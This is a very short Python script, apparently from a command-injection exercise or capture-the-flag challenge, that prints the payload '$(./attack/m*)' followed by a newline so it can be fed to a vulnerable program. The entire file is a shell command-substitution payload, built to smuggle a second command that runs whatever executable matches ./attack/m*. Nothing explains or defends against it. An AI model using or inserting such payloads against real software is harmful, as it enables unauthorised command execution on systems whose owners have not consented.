#!/usr/bin/env python3
import sys

payload = b"$(./attack/m*)\n"

sys.stdout.buffer.write(payload)
